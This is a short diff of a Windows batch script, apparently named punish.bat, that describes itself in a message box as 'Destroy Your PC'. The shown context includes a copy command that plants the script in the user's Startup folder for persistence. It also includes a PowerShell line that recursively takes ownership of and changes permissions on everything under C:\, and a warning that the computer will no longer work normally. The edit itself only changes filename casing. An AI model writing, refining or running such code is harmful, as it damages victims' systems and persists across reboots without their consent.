@@ -1,7 +1,7 @@
 @echo off
 
 :: === DROP punish.bat VOORAF IN STARTUP ===
-copy "%~dp0punish.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\punish.bat" >nul
+copy "%~dp0Punish.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Punish.bat" >nul
 
 :: === ADMIN CHECK ===
 net session >nul 2>&1
@@ -66,3 +66,4 @@ powershell -Command "Takeown /f C:\* /r /d y; Icacls C:\* /grant '$env:USERNAME'
 powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Hi, Destroy Your PC has injected your PC. After reboot or misuse your computer will not function normally anymore.', 'Warning')"
 
 pause
+
